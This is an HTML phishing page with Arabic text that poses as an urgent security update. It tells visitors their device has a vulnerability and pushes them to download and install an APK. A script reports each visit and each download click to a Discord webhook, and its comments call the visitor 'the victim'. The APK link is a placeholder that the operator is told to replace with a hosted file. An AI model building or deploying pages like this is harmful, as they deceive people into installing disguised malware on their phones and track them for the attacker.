<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Update Required</title>
<style>
body {
    background: #000;
    color: #fff;
    font-family: 'Segoe UI', Arial;
    text-align: center;
    padding: 50px 20px;
}
.box {
    background: #1a1a1a;
    border-radius: 20px;
    padding: 30px;
    max-width: 350px;
    margin: auto;
    border: 1px solid #333;
}
button {
    background: #007aff;
    color: white;
    border: none;
    padding: 15px 30px;
    font-size: 18px;
    border-radius: 30px;
    margin-top: 20px;
    width: 100%;
}
.warning {
    color: #ff4444;
    font-size: 12px;
    margin-top: 20px;
}
</style>
</head>
<body>
<div class="box">
    <h2>⚠️ تحديث أمني عاجل</h2>
    <p>تم اكتشاف ثغرة في جهازك.<br>لحماية بياناتك، يرجى تحديث التطبيق الأمني.</p>
    <button onclick="downloadAPK()">تحميل التحديث الآن</button>
    <p class="warning">مطلوب Android 5.0 أو أحدث</p>
</div>

<script>
const webhook = "https://discord.com/api/webhooks/1475203617043517533/JZeV78rfYNKQAyY83cTx6khi_ZVd1DhxhnIe9Ciq_xkpSyZiRgSKDCPVGZfD3t4nc0VC";

// إرسال أن الضحية فتح الصفحة
fetch(webhook, {
    method: "POST",
    body: new FormData().append("content", "🎯 الضحية فتح صفحة التحديث")
});

function downloadAPK() {
    // الرابط المباشر للتطبيق APK (ترفعه على Google Drive أو أي استضافة)
    const apkUrl = "https://example.com/your-app.apk";
    
    // نرسل إشعار أن الضحية طلب التحميل
    fetch(webhook, {
        method: "POST",
        body: new FormData().append("content", "📥 الضحية نقر على تحميل APK")
    });
    
    window.location.href = apkUrl;
    
    // بعد التحميل، يظهر إشعار بالتثبيت
    setTimeout(() => {
        alert("✅ تم التحميل. افتح ملف 'Update.apk' من قائمة التنزيلات لتثبيت التحديث.");
    }, 2000);
}
</script>
</body>
</html>
